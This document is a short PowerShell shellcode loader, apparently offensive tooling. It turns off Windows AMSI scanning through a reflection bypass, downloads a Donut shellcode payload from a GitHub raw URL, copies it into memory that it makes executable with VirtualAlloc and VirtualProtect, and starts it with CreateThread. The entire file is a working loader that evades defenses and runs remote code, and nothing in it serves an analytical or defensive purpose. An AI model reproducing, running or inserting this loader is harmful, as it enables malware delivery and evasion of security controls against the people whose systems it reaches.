# loader.ps1 - Fetch Donut shellcode + execute in memory (self-injection for simplicity)

# Optional basic AMSI bypass
try { [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true) } catch {}

$url = "https://github.com/MJansen6/bp/raw/refs/heads/main/shellcode.bin"
$wc = New-Object Net.WebClient
$shellcode = $wc.DownloadData($url)

$size = $shellcode.Length

$mem = [Runtime.InteropServices.Marshal]::AllocHGlobal($size)
[Runtime.InteropServices.Marshal]::Copy($shellcode, 0, $mem, $size)

# VirtualAlloc RW → copy → RX
Add-Type -MemberDefinition @"
[DllImport("kernel32")] public static extern IntPtr VirtualAlloc(IntPtr a, uint s, uint t, uint p);
[DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr a, uint s, uint p, out uint o);
[DllImport("kernel32")] public static extern IntPtr CreateThread(IntPtr a, uint s, IntPtr f, IntPtr p, uint c, out uint i);
[DllImport("kernel32")] public static extern uint WaitForSingleObject(IntPtr h, uint ms);
"@ -Name Win32 -Namespace Native

$addr = [Native.Win32]::VirtualAlloc([IntPtr]::Zero, [uint32]$size, 0x3000, 0x04)  # RW
[Runtime.InteropServices.Marshal]::Copy($shellcode, 0, $addr, $size)
$old = 0
[Native.Win32]::VirtualProtect($addr, [uint32]$size, 0x20, [ref]$old)  # RX

$tid = 0
$thread = [Native.Win32]::CreateThread([IntPtr]::Zero, 0, $addr, [IntPtr]::Zero, 0, [ref]$tid)
[Native.Win32]::WaitForSingleObject($thread, 0xFFFFFFFF)
